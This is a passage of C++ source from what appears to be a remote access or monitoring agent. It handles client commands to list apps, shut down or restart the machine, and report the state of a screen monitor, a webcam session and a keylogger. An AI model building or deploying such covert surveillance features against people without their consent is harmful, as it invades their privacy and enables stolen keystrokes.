                    std::string res = "DATA:APPS:";
                    for(size_t i=0; i<apps.size(); ++i) {
                         if(i > 0) res += ";";
                         res += apps[i].id + "|" + apps[i].name + "|" + apps[i].icon + "|" + apps[i].exec + "|" + apps[i].keywords;
                    }
                    send_text(res, cid, my_backend_id);
                });
            }
            else if(cmd == "shutdown") {
                send_text("INFO:System Shutdown Initiated", cid, my_backend_id);
                app_manager_->shutdown_system();
            }
            else if(cmd == "restart") {
                send_text("INFO:System Restart Initiated", cid, my_backend_id);
                app_manager_->restart_system();
            }
            else if (cmd == "get_state") {
                 // Report actual state of each feature
                 if(session_->is_active())
                     send_text("STATUS:SYNC:monitor=active", cid, my_backend_id);
                 else
                     send_text("STATUS:SYNC:monitor=inactive", cid, my_backend_id);

                 if(webcam_session_->is_active())
                     send_text("STATUS:SYNC:webcam=active", cid, my_backend_id);
                 else
                     send_text("STATUS:SYNC:webcam=inactive", cid, my_backend_id);

                 if(keylogger_->is_active())
                     send_text("STATUS:SYNC:keylogger=active", cid, my_backend_id);
                 else
                     send_text("STATUS:SYNC:keylogger=inactive", cid, my_backend_id);

                 send_text("STATUS:SYNC:complete", cid, my_backend_id);
            }
            else {
                // if(cmd.length() > 0) std::cout << "[CMD] " << cmd << std::endl;
            }
        }

        // Cleanup
        *stop_writer = true;
        cv_writer->notify_all();
        if (writer_thread.joinable()) writer_thread.join();

        bus_monitor_->unsubscribe(cid);
        bus_webcam_->unsubscribe(cid);
    }

    // Deprecated methods removed
    // send_frame removed as part of cleanup

} // namespace core
